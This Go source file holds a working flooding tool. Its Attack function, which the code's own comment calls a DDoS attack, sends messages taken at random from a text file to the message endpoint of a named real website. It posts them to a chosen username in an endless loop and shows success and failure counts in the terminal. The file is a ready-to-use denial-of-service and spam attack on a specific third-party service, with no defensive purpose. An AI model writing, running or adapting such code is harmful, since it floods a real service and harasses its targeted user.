package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"github.com/buger/goterm"
	"github.com/fatih/color"
)

// EndPoint holds the API URL for sending messages.
const EndPoint = "http://stulish.com/Home/sendMess"

// Payload holds request data structure for sending message.
type Payload struct {
	PUserName string `json:"pUserName"`
	PContent  string `json:"pContent"`
}

// ResponseData holds response data structure.
type ResponseData struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
}

// Attack performs the DDoS attack.
func Attack(username, messageFilePath string) {
	if utf8.RuneCountInString(username) == 0 {
		logError("stulish username is not specified")
		return
	}

	if utf8.RuneCountInString(messageFilePath) == 0 {
		logError("message text file is not specified")
		return
	}

	data, err := ioutil.ReadFile(messageFilePath)
	if err != nil {
		logError(fmt.Sprintf("can't read message file: %s", messageFilePath))
		return
	}

	messages := strings.Split(string(data), "\n")
	mLn := len(messages)
	rand := rand.New(rand.NewSource(time.Now().UnixNano()))

	success := 0
	failed := 0
	prevTextLn := 0
	startTime := time.Now()

	log("\n")

	out := formatOutput(success, failed, time.Since(startTime))
	goterm.Println(out)
	goterm.Flush()
	prevTextLn = len(out)
	for {
		reqPayload := Payload{
			PUserName: username,
			PContent:  messages[rand.Intn(mLn)],
		}

		err := sendMessage(reqPayload)

		if err == nil {
			success++
		} else {
			failed++
		}

		out := formatOutput(success, failed, time.Since(startTime))

		goterm.MoveCursorUp(2)
		goterm.MoveCursorBackward(prevTextLn)
		goterm.Println(out)
		goterm.Flush()
		prevTextLn = len(out)
	}

}

func formatOutput(success, failed int, elapsed time.Duration) string {
	return fmt.Sprintf("   Success: %s  Failed: %s  Elapsed: %s",
		color.GreenString(strconv.Itoa(success)),
		color.RedString(strconv.Itoa(failed)),
		color.CyanString(fmt.Sprintf("%.3fsec", elapsed.Seconds())),
	)
}

func sendMessage(payload Payload) error {
	reqData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := http.Post(EndPoint, "application/json; charset=utf-8", strings.NewReader(string(reqData)))
	if err != nil {
		return err
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("couldn't send message")
	}

	resBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	resp.Body.Close()

	var resData ResponseData
	err = json.Unmarshal(resBody, &resData)
	if err != nil {
		return err
	}

	if resData.Code != 1 {
		return fmt.Errorf("couldn't send message")
	}

	return nil
}
